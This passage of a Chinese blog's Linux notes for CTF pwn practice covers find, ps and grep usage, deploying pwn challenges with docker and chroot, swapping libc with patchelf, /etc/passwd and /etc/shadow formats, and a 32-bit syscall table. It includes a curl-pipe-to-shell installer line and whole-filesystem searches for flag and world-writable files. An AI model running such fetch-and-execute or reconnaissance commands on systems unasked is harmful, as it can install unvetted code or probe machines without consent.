class="comment">#从主目录下查找test目录</span></span><br><span class="line">find / -<span class="built_in">type</span> d -name <span class="built_in">test</span></span><br><span class="line"><span class="comment">#从主目录下找flag文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f -name flag.txt</span><br><span class="line">find / -<span class="built_in">type</span> f -name flag.php</span><br><span class="line"><span class="comment">#从主目录下查找所有的txt文件或php文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">"*.txt"</span></span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">"*.php"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#根据文件权限来查找文件</span></span><br><span class="line"><span class="comment">#查找777权限的文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f -perm 0777 -<span class="built_in">print</span></span><br><span class="line"><span class="comment">#查找没有777权限的文件(主要查找当前目录)</span></span><br><span class="line">find -<span class="built_in">type</span> f ! -perm 777</span><br><span class="line"><span class="comment">#查找只读文件</span></span><br><span class="line">find / -perm /u=r</span><br><span class="line"><span class="comment">#查找可执行文件</span></span><br><span class="line">find -perm /a=x</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据日期和时间查找文件和目录</span></span><br><span class="line"><span class="comment">#最近1小时内查找更改的文件</span></span><br><span class="line">find / -cmin -60</span><br><span class="line"><span class="comment">#最近1小时内查找修改的文件</span></span><br><span class="line">find / -mmin -60</span><br><span class="line"><span class="comment">#查找最近1小时内访问的文件</span></span><br><span class="line">find / -amin -60</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据文件大小查找文件</span></span><br><span class="line"><span class="comment">#找到50mb的文件</span></span><br><span class="line">find / -size 50M</span><br><span class="line"><span class="comment">#找到50mb-100mb的文件</span></span><br><span class="line">find / -size +50M -size -100M</span><br></pre></td></tr></table></figure><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep xx  &#x2F;&#x2F;查看有关进程</span><br><span class="line">pstree  &#x2F;&#x2F;进程树</span><br><span class="line">pidof xx &#x2F;&#x2F;查看相关pid</span><br></pre></td></tr></table></figure><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">grep [options]</span><br><span class="line">    主要参数：  grep --help可查看</span><br><span class="line">        -c：只输出匹配行的计数。</span><br><span class="line">        -i：不区分大小写。</span><br><span class="line">        -h：查询多文件时不显示文件名。</span><br><span class="line">        -l：查询多文件时只输出包含匹配字符的文件名。</span><br><span class="line">        -n：显示匹配行及 行号。</span><br><span class="line">        -s：不显示不存在或无匹配文本的错误信息。</span><br><span class="line">        -v：显示不包含匹配文本的所有行。</span><br><span class="line">        --color&#x3D;auto ：可以将找到的关键词部分加上颜色的显示。</span><br></pre></td></tr></table></figure><h1 id="0x03部署pwn题目"><a href="#0x03部署pwn题目" class="headerlink" title="0x03部署pwn题目"></a>0x03部署pwn题目</h1><p><a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="noopener">https://github.com/giantbranch/pwn_deploy_chroot</a></p><h2 id="pwn-deploy-chroot介绍"><a href="#pwn-deploy-chroot介绍" class="headerlink" title="pwn_deploy_chroot介绍"></a>pwn_deploy_chroot介绍</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><blockquote><ol><li>一次可以部署多个题目到一个docker容器中</li><li>自动生成flag,并备份到当前目录</li><li>也是基于xinted + docker + chroot</li><li>利用python脚本根据pwn的文件名自动化地生成3个文件：pwn.xinetd，Dockerfile和docker-compose.yml</li><li>在/bin目录，利用自己编写的静态编译的catflag程序作为/bin/sh,这样的话，system(“/bin/sh”)实际执行的只是读取flag文件的内容，完全不给搅屎棍任何操作的余地</li><li>默认从10000端口监听，多一个程序就+1，起始的监听端口可以在config.py配置，或者生成pwn.xinetd和docker-compose.yml后自己修改这两个文件</li></ol></blockquote><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 安装docker</span><br><span class="line">curl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh</span><br><span class="line"># 安装 docker compose 和git</span><br><span class="line">apt install docker-compose git</span><br><span class="line"># 下载</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;giantbranch&#x2F;pwn_deploy_chroot.git</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>只需要3步：</p><blockquote><ol><li>将所有pwn题目放入bin目录（注意名字不带特殊字符，因为会将文件名作为linux用户名）</li><li>python <a href="http://initialize.py/" target="_blank" rel="noopener">initialize.py</a></li><li>docker-compose up —build -d</li></ol></blockquote><p>下面给下详细操作：</p><p>1、将你要部署的pwn题目放到bin目录</p><p>我的项目已经将一个程序copy了3分作为示例，注意文件名不要含有特殊字符，文件名建议使用字母，下划线，横杆和数字，当然全字母的当然最好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# ls bin&#x2F;</span><br><span class="line">pwn1  pwn1_copy1  pwn1_copy2</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>2、<a href="http://xn--initialize-3f62aw61d.py/" target="_blank" rel="noopener">运行initialize.py</a></p><p>运行脚本后会输出每个pwn的监听端口，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# python initialize.py</span><br><span class="line"></span><br><span class="line">pwn1&#39;s port: 10000</span><br><span class="line">pwn1_copy1&#39;s port: 10001</span><br><span class="line">pwn1_copy2&#39;s port: 10002</span><br></pre></td></tr></table></figure><p>文件与端口信息，还有随机生成的flag默认备份到flags.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# cat flags.txt </span><br><span class="line">pwn1: flag&#123;93aa6da5-db45-46fa-a2e1-af2be6698692&#125;</span><br><span class="line">pwn1_copy1: flag&#123;f9966c51-52e4-4212-ac44-97bf16620b41&#125;</span><br><span class="line">pwn1_copy2: flag&#123;b17949ce-e3fa-4ca7-9fcc-44b8dc997cb3&#125;</span><br><span class="line"></span><br><span class="line">pwn1&#39;s port: 10000</span><br><span class="line">pwn1_copy1&#39;s port: 10001</span><br><span class="line">pwn1_copy2&#39;s port: 10002</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><p>3、启动环境</p><p>请使用root用户执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up --build -d</span><br></pre></td></tr></table></figure><p>不出意外，题目就启动起来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# netstat -antp | grep docker</span><br><span class="line">tcp6       0      0 :::10002                :::*                    LISTEN      19828&#x2F;docker-proxy</span><br><span class="line">tcp6       0      0 :::10000                :::*                    LISTEN      19887&#x2F;docker-proxy</span><br><span class="line">tcp6       0      0 :::10001                :::*                    LISTEN      19873&#x2F;docker-proxy</span><br></pre></td></tr></table></figure><h1 id="0x04-加载不同的libc"><a href="#0x04-加载不同的libc" class="headerlink" title="0x04 加载不同的libc"></a>0x04 加载不同的libc</h1><p>下载patchelf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;codechina.csdn.net&#x2F;mirrors&#x2F;NixOS&#x2F;patchelf.git</span><br></pre></td></tr></table></figure><p>下载glibc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;matrix1001&#x2F;glibc-all-in-one</span><br></pre></td></tr></table></figure><p><strong>glibc</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;update_list</span><br><span class="line">cat list</span><br><span class="line">.&#x2F;download xxlibc &#x2F;&#x2F;下载需要的libc</span><br></pre></td></tr></table></figure><p><strong>patchelf</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">.&#x2F;bootstrap.sh</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">make check</span><br></pre></td></tr></table></figure><h2 id="生成符号链接"><a href="#生成符号链接" class="headerlink" title="生成符号链接"></a>生成符号链接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;lib64</span><br><span class="line">sudo su</span><br><span class="line">sudo ln -s &#x2F;home&#x2F;pz1o&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64&#x2F;ld-2.27.so .&#x2F;2.27-ld.so.2</span><br></pre></td></tr></table></figure><h2 id="更换elf文件的ld和libc"><a href="#更换elf文件的ld和libc" class="headerlink" title="更换elf文件的ld和libc"></a>更换elf文件的ld和libc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter &#x2F;lib64&#x2F;2.27-ld.so.2 .&#x2F;tcache</span><br><span class="line">patchelf --replace-needed libc.so.6 ~&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64&#x2F;libc-2.27.so .&#x2F;tcache</span><br><span class="line">patchelf --set-interpreter &#x2F;home&#x2F;pz1o&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64&#x2F;ld-2.27.so  --set-rpath  ~&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.2_amd64 tcache</span><br></pre></td></tr></table></figure><h1 id="0x06-用户和权限"><a href="#0x06-用户和权限" class="headerlink" title="0x06 用户和权限"></a>0x06 用户和权限</h1><h2 id="1-用户"><a href="#1-用户" class="headerlink" title="1.用户"></a>1.用户</h2><h3 id="1-1-用户标识号"><a href="#1-1-用户标识号" class="headerlink" title="1.1 用户标识号"></a>1.1 用户标识号</h3><p>0： root，超级用户。<br>1-499：系统用户，保证系统服务正常运行，一般不使用。<br>500-60000：普通用户，可登录系统，拥有一定的权限。管理员添加的用户在此范围内。</p><p>用户名和标识号不一定一一对应，Linux允许几个登录名对应同一个用户标识号。</p><p>系统内部管理进程和文件访问权限时使用用户标识号。</p><p>账号和标识号的对应关系在/etc/passwd文件中。</p><h3 id="1-2-etc-passwd"><a href="#1-2-etc-passwd" class="headerlink" title="1.2 /etc/passwd"></a>1.2 /etc/passwd</h3><p><strong>该文件所有者和所属组为root</strong>，除了root用户外只有读取的权限。</p><p>格式为</p><p>登录名：口令：用户标识号：组标识号：注释：用户主目录：Shell程序</p><blockquote><p>登录名：同意系统中唯一，大小敏感。<br>口令：密码，root和用户可使用passwd命令修改。<br>用户标识号：唯一。<br>组标识号：每个用户可以同时属于多个组。<br>注释：相关信息，真实姓名、联系电话等。mail和finger等会使用这些信息。<br>用户主目录：用户登录后的默认工作目录。root为/root，一般用户在/home下。<br>Shell程序：登录后默认启动的Shell程序。</p></blockquote><h3 id="1-3-etc-shadow"><a href="#1-3-etc-shadow" class="headerlink" title="1.3 /etc/shadow"></a>1.3 /etc/shadow</h3><p>包含用户的密码和过期时间，只有root组可读写。</p><p>格式为</p><p>登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：密码禁用期：账户失效时间：保留字段</p><blockquote><p>登录名：略。<br>加密口令：*表示账户被锁定，！表示密码被锁定。其他的前三位表示加密方式。<br>最后一次修改时间：最近修改密码的时间，天为单位，1970年1月1日算起。<br>最小时间间隔：最小修改密码的时间间隔。<br>最大时间间隔：最长密码有效期，到期要求修改密码。<br>警告时间：密码过期后多久发出警告。<br>密码禁用期：密码过期后仍然接受的最长期限。<br>账号失效时间：账户的有效期，1970年1月1日算起，空串表示永不过期。<br>保留字段：保留将来使用。</p></blockquote><h2 id="2-用户组"><a href="#2-用户组" class="headerlink" title="2.用户组"></a>2.用户组</h2><p>Linux本身预定义了许多用户组，包括root、daemon、bin、sys等，用户可根据需要自行添加用户组。</p><p>用户组拥有组名、组标识号、组成员等属性。</p><h3 id="2-1-etc-group"><a href="#2-1-etc-group" class="headerlink" title="2.1 /etc/group"></a>2.1 /etc/group</h3><p>格式为</p><p>组名：口令：组标识号：成员列表</p><h2 id="3-用户管理"><a href="#3-用户管理" class="headerlink" title="3. 用户管理"></a>3. 用户管理</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//add</span><br><span class="line">useradd [option] 登录名</span><br><span class="line">//如果没有指定–system和–group选项，则创建普通用户。</span><br><span class="line">adduser [option] user</span><br><span class="line"></span><br><span class="line">//del</span><br><span class="line">userdel [option] 用户名</span><br><span class="line">-f：强制删除（谨慎使用）</span><br><span class="line">-r：主目录中的文件一并删除。</span><br><span class="line"></span><br><span class="line">//edit passwd</span><br><span class="line">passwd [option] 登录名</span><br><span class="line"></span><br><span class="line">//show user information</span><br><span class="line">id [option] [用户]</span><br><span class="line"></span><br><span class="line">//change user</span><br><span class="line">su [option] [用户名]</span><br></pre></td></tr></table></figure><h2 id="4-用户组管理"><a href="#4-用户组管理" class="headerlink" title="4.用户组管理"></a>4.用户组管理</h2><p>把user换成group</p><h1 id="0x07-一些小问题"><a href="#0x07-一些小问题" class="headerlink" title="0x07 一些小问题"></a>0x07 一些小问题</h1><h2 id="1-外网ip"><a href="#1-外网ip" class="headerlink" title="1.外网ip"></a>1.外网ip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl ifconfig.me</span><br></pre></td></tr></table></figure><h2 id="2-系统调用号"><a href="#2-系统调用号" class="headerlink" title="2.系统调用号"></a>2.系统调用号</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_32.h &gt; syscall.list</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>系统调用</th><th>调用号</th><th>系统调用</th><th>调用号</th></tr></thead><tbody><tr><td>exit</td><td>1</td><td>fork</td><td>2</td></tr><tr><td>read</td><td>3</td><td>write</td><td>4</td></tr><tr><td>open</td><td>5</td><td>close</td><td>6</td></tr><tr><td>waitpid</td><td>7</td><td>creat</td><td>8</td></tr><tr><td>link</td><td>9</td><td>unlink</td><td>10</td></tr><tr><td>execve</td><td>11</td><td>chdir</td><td>12</td></tr><tr><td>time</td><td>13</td><td>mknod</td><td>14</td></tr><tr><td>chmod</td><td>15</td><td>lchown</td><td>16</td></tr><tr><td>break</td><td>17</td><td>oldstat</td><td>18</td></tr><tr><td>lseek</td><td>19</td><td>getpid</td><td>20</td></tr><tr><td>mount</td><td>21</td><td>umount</td><td>22</td></tr><tr><td>setuid</td><td>23</td><td>getuid</td><td>24</td></tr><tr><td>stime</td><td>25</td><td>ptrace</td><td>26</td></tr><tr><td>alarm</td><td>27</td><td>oldfstat</td><td>28</td></tr><tr><td>pause</td><td>29</td><td>utime</td><td>30</td></tr><tr><td>stty</td><td>31</td><td>gtty</td><td>32</td></tr><tr><td>access</td><td>33</td><td>nice</td><td>34</td></tr><tr><td>ftime</td><td>35</td><td>sync</td><td>36</td></tr><tr><td>kill</td><td>37</td><td>rename</td><td>38</td></tr><tr><td>mkdir</td><td>39</td><td>rmdir</td><td>40</td></tr><tr><td>dup</td><td>41</td><td>pipe</td><td>42</td></tr><tr><td>times</td><td>43</td><td>prof</td><td>44</td></tr><tr><td>brk</td><td>45</td><td>setgid</td><td>46</td></tr><tr><td>getgid</td><td>47</td><td>signal</td><td>48</td></tr><tr><td>geteuid</td><td>49</td><td>getegid</td><td>50</td></tr><tr><td>acct</td><td>51</td><td>umount2</td><td>52</td></tr><tr><td>lock</td><td>53</td><td>ioctl</td><td>54</td></tr><tr><td>fcntl</td><td>55</td><td>mpx</td><td>56</td></tr><tr><td>setpgid</td><td>57</td><td>ulimit</td><td>58</td></tr><tr><td>oldolduname</td><td>59</td><td>umask</td><td>60</td></tr><tr><td>chroot</td><td>61</td><td>ustat</td><td>62</td></tr><tr><td>dup2</td><td>63</td><td>getppid</td><td>64</td></tr><tr><td>getpgrp</td><td>65</td><td>setsid</td><td>66</td></tr><tr><td>sigaction</td><td>67</td><td>sgetmask</td><td>68</td></tr><tr><td>ssetmask</td><td>69</td><td>setreuid</td><td>70</td></tr><tr><td>setregid</td><td>71</td><td>sigsuspend</td><td>72</td></tr><tr><td>sigpending</td><td>73</td><td>sethostname</td><td>74</td></tr><tr><td>setrlimit</td><td>75</td><td>getrlimit</td><td>76</td></tr><tr><td>getrusage</td><td>77</td><td>gettimeofday</td><td>78</td></tr><tr><td>settimeofday</td><td>79</td><td>getgroups</td><td>80</td></tr><tr><td>setgroups</td><td>81</td><td>select</td><td>82</td></tr><tr><td>symlink</td><td>83</td><td>oldlstat</td><td>84</td></tr><tr><td>readlink</td><td>85</td><td>uselib</td><td>86</td></tr><tr><td>swapon</td><td>87</td><td>reboot</td><td>88</td></tr><tr><td>readdir</td><td>89</td><td>mmap</td><td>90</td></tr><tr><td>munmap</td><td>91</td><td>truncate</td><td>92</td></tr><tr><td>ftruncate</td><td>93</td><td>fchmod</td><td>94</td></tr><tr><td>fchown</td><td>95</td><td>getpriority</td><td>96</td></tr><tr><td>setpriority</td><td>97</td><td>profil</td><td>98</td></tr><tr><td>statfs</td><td>99</td><td>fstatfs</td><td>100</td></tr><tr><td>ioperm</td><td>101</td><td>socketcall</td><td>102</td></tr><tr><td>syslog</td><td>103</td><td>setitimer</td><td>104</td></tr><tr><td>getitimer</td><td>105</td><td>stat</td><td>106</td></tr><tr><td>lstat</td><td>107</td><td>fstat</td><td>108</td></tr><tr><td>olduname</td><td>109</td><td>iopl</td><td>110</td></tr><tr><td>vhangup</td><td>111</td><td>idle</td><td>112</td></tr><tr><td>vm86old</td><td>113</td><td>wait4</td><td>114</td></tr><tr><td>swapoff</td><td>115</td><td>sysinfo</td><td>116</td></tr><tr><td>ipc</td><td>117</td><td>fsync</td><td>118</td></tr><tr><td>sigreturn</td><td>119</td><td>clone</td><td>120</td></tr><tr><td>setdomainname</td><td>121</td><td>uname</td><td>122</td></tr><tr><td>modify_ldt</td><td>123</td><td>adjtimex</td><td>124</td></tr><tr><td>mprotect</td><td>125</td><td>sigprocmask</td><td>126</td></tr><tr><td>create_module</td><td>127</td><td>init_module</td><td>128</td></tr><tr><td>delete_module</td><td>129</td><td>get_kernel_syms</td><td>130</td></tr><tr><td>quotactl</td><td>131</td><td>getpgid</td><td>132</td></tr><tr><td>fchdir</td><td>133</td><td>bdflush</td><td>134</td></tr><tr><td>sysfs</td><td>135</td><td>personality</td><td>136</td></tr><tr><td>afs_syscall</td><td>137</td><td>setfsuid</td><td>138</td></tr><tr><td>setfsgid</td><td>139</td><td>_llseek</td><td>140</td></tr><tr><td>getdents</td><td>141</td><td>_newselect</td><td>142</td></tr><tr><td>flock</td><td>143</td><td>msync</td><td>144</td></tr><tr><td>readv</td><td>145</td><td>writev</td><td>146</td></tr><tr><td>getsid</td><td>147</td><td>fdatasync</td><td>148</td></tr><tr><td>_sysctl</td><td>149</td><td>mlock</td><td>150</td></tr><tr><td>munlock</td><td>151</td><td>mlockall</td><td>152</td></tr><tr><td>munlockall</td><td>153</td><td>sched_setparam</td><td>154</td></tr><tr><td>sched_getparam</td><td>155</td><td>sched_setscheduler</td><td>156</td></tr><tr><td>sched_getscheduler</td><td>157</td><td>sched_yield</td><td>158</td></tr><tr><td>sched_get_priority_max</td><td>159</td><td>sched_get_priority_min</td><td>160</td></tr><tr><td>sched_rr_get_interval</td><td>161</td><td>nanosleep</td><td>162</td></tr><tr><td>mremap</td><td>163</td><td>setresuid</td><td>164</td></tr><tr><td>getresuid</td><td>165</td><td>vm86</td><td>166</td></tr><tr><td>query_module</td><td>167</td><td>poll</td><td>168</td></tr><tr><td>nfsservctl</td><td>169</td><td>setresgid</td><td>170</td></tr><tr><td>getresgid</td><td>171</td><td>prctl</td><td>172</td></tr><tr><td>rt_sigreturn</td><td>173</td><td>rt_sigaction</td><td>174</td></tr><tr><td>rt_sigprocmask</td><td>175</td><td>rt_sigpending</td><td>176</td></tr><tr><td>rt_sigtimedwait</td><td>177</td><td>rt_sigqueueinfo</td><td>178</td></tr><tr><td>rt_sigsuspend</td><td>179</td><td>pread64</td><td>180</td></tr><tr><td>pwrite64</td><td>181</td><td>chown</td><td>182</td></tr><tr><td>getcwd</td><td>183</td><td>capget</td><td>184</td></tr><tr><td>capset</td><td>185</td><td>sigaltstack</td><td>186</td></tr><tr><td>sendfile</td><td>187</td><td>getpmsg</td><td>188</td></tr><tr><td>putpmsg</td><td>189</td><td>vfork</td><td>190</td></tr><tr><td>ugetrlimit</td><td>191</td><td>mmap2</td><td>192</td></tr><tr><td>truncate64</td><td>193</td><td>ftruncate64</td><td>194</td></tr><tr><td>stat64</td><td>195</td><td>lstat64</td><td>196</td></tr><tr><td>fstat64</td><td>197</td><td>lchown32</td><td>198</td></tr><tr><td>getuid32</td><td>199</td><td>getgid32</td><td>200</td></tr><tr><td>geteuid32</td><td>201</td><td>getegid32</td><td>202</td></tr><tr><td>setreuid32</td><td>203</td><td>setregid32</td><td>204</td></tr><tr><td>getgroups32</td><td>205</td><td>setgroups32</td><td>206</td></tr><tr><td>fchown32</td><td>207</td><td>setresuid32</td><td>208</td></tr><tr><td>getresuid32</td><td>209</td><td>setresgid32</td><td>210</td></tr><tr><td>getresgid32</td><td>211</td><td>chown32</td><td>212</td></tr><tr><td>setuid32</td><td>213</td><td>setgid32</td><td>214</td></tr><tr><td>setfsuid32</td><td>215</td><td>setfsgid32</td><td>216</td></tr><tr><td>pivot_root</td><td>217</td><td>mincore</td><td>218</td></tr><tr><td>madvise</td><td>219</td><td>madvise1</td><td>219</td></tr><tr><td>getdents64</td><td>220</td><td>⏫delete when C</td><td>lib stub is removed</td></tr><tr><td>fcntl64</td><td>221</td><td>gettid</td><td>224</td></tr><tr><td>readahead</td><td>225</td><td>setxattr</td><td>226</td></tr><tr><td>lsetxattr</td><td>227</td><td>fsetxattr</td><td>228</td></tr><tr><td>getxattr</td><td>229</td><td>lgetxattr</td><td>230</td></tr><tr><td>fgetxattr</td><td>231</td><td>listxattr</td><td>232</td></tr><tr><td>llistxattr</td><td>233</td><td>flistxattr</td><td>234</td></tr><tr><td>removexattr</td><td>235</td><td>lremovexattr</td><td>236</td></tr><tr><td>fremovexattr</td><td>237</td><td>tkill</td><td>238</td></tr><tr><td>sendfile64</td><td>239</td><td>futex</td><td>240</td></tr><tr><td>sched_setaffinity</td><td>241</td><td>sched_getaffinity</td><td>242</td></tr><tr><td>set_thread_area</td><td>243</td><td>get_thread_area</td><td>244</td></tr><tr><td>io_setup</td><td>245</td><td>io_destroy</td><td>246</td></tr><tr><td>io_getevents</td><td>247</td><td>io_submit</td><td>248</td></tr><tr><td>io_cancel</td><td>249</td><td>fadvise64</td><td>250</td></tr><tr><td></td><td></td><td>exit_group</td><td>252</td></tr><tr><td>lookup_dcookie</td><td>253</td><td>epoll_create</td><td>254</td></tr><tr><td>epoll_ctl</td><td>255</td><td>epoll_wait</td><td>256</td></tr><tr><td>remap_file_pages</td><td>257</td><td>set_tid_address</td><td>258</td></tr><tr><td>timer_create</td><td>259</td><td>timer_settime</td><td>260</td></tr><tr><td>timer_gettime</td><td>261</td><td>timer_getoverrun</td><td>262</td></tr><tr><td>timer_delete</td><td>263</td><td>clock_settime</td><td>264</td></tr><tr><td>clock_gettime</td><td>265</td><td>clock_getres</td><td>266</td></tr><tr><td>clock_nanosleep</td><td>267</td><td>statfs64</td><td>268</td></tr><tr><td>fstatfs64</td><td>269</td><td>tgkill</td><td>270</td></tr><tr><td>utimes</td><td>271</td><td>fadvise64_64</td><td>272</td></tr><tr><td>vserver</td><td>273</td><td>mbind</td><td>274</td></tr><tr><td>get_mempolicy</td><td>275</td><td>set_mempolicy</td><td>276</td></tr><tr><td>mq_open</td><td>277</td><td>mq_unlink</td><td>278</td></tr><tr><td>mq_timedsend</td><td>279</td><td>mq_timedreceive</td><td>280</td></tr><tr><td>mq_notify</td><td>281</td><td>mq_getsetattr</td><td>282</td></tr><tr><td>kexec_load</td><td>283</td><td>waitid</td><td>284</td></tr><tr><td>sys_setaltroot</td><td>285</td><td>add_key</td><td>286</td></tr><tr><td>request_key</td><td>287</td><td>keyctl</td><td>288</td></tr><tr><td>ioprio_set</td><td>289</td><td>ioprio_get</td><td>290</td></tr><tr><td>inotify_init</td><td>291</td><td>inotify_add_watch</td><td>292</td></tr><tr><td>inotify_rm_watch</td><td>293</td><td>migrate_pages</td><td>294</td></tr><tr><td>openat</td><td>295</td><td>mkdirat</td><td>296</td></tr><tr><td>mknodat</td><td>297</td><td>fchownat</td><td>298</td></tr><tr><td>futimesat</td><td>299</td><td>fstatat64</td><td>300</td></tr><tr><td>unlinkat</td><td>301</td><td>renameat</td><td>302</td></tr><tr><td>linkat</td><td>303</td><td>symlinkat</td><td>304</td></tr><tr><td>readlinkat</td><td>305</td><td>fchmodat</td><td>306</td></tr><tr><td>faccessat</td><td>307</td><td>pselect6</td><td>308</td></tr><tr><td>ppoll</td><td>309</td><td>unshare</td><td>310</td></tr><tr><td>set_robust_list</td><td>311</td><td>get_robust_list</td><td>312</td></tr><tr><td>splice</td><td>313</td><td>sync_file_range</td><td>314</td></tr><tr><td>tee</td><td>315</td><td>vmsplice</td><td>316</td></tr><tr><td>move_pages</td><td>317</td><td>getcpu</td><td>318</td></tr><tr><td>epoll_pwait</td><td>319</td><td>utimensat</td><td>320</td></tr><tr><td>signalfd</td><td>321</td><td>timerfd_create</td><td>322</td></tr><tr><td>eventfd</td><td>323</td><td>fallocate</td><td>324</td></tr><tr><td>timerfd_settime</td><td>325</td><td>timerfd_gettime</td><td>326</td></tr><tr><td>signalfd4</td><td>327</td><td>eventfd2</td><td>328</td></tr><tr><td>epoll_create1</td><td>329</td><td>dup3</td><td>330</td></tr><tr><td>pipe2</td><td>331</td><td>inotify_init1</td><td>332</td></tr><tr><td>preadv</td><td>333</td><td>pwritev</td><td>334</td></tr><tr><td>rt_tgsigqueueinfo</td><td>335</td><td>perf_event_open</td><td>336</td></tr><tr><td>recvmmsg</td><td>337</td><td>fanotify_init</td><td>338</td></tr><tr><td>fanotify_mark</td><td>339</td><td>prlimit64</td><td>340</td></tr><tr><td>name_to_handle_at</td><td>341</td><td>open_by_handle_at</td><td>342</td></tr><tr><td>clock_adjtime</td><td>343</td><td>syncfs</td><td>344</td></tr><tr><td>sendmmsg</td><td>345</td><td>set_ns</td><td>346</td></tr><tr><td>process_vm_readv</td><td>347</td><td>process_vm_writev</td><td>348</td></tr></tbody></table></div><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_64.h &gt; syscall.list</span><br></pre></td></tr></table></figure><div 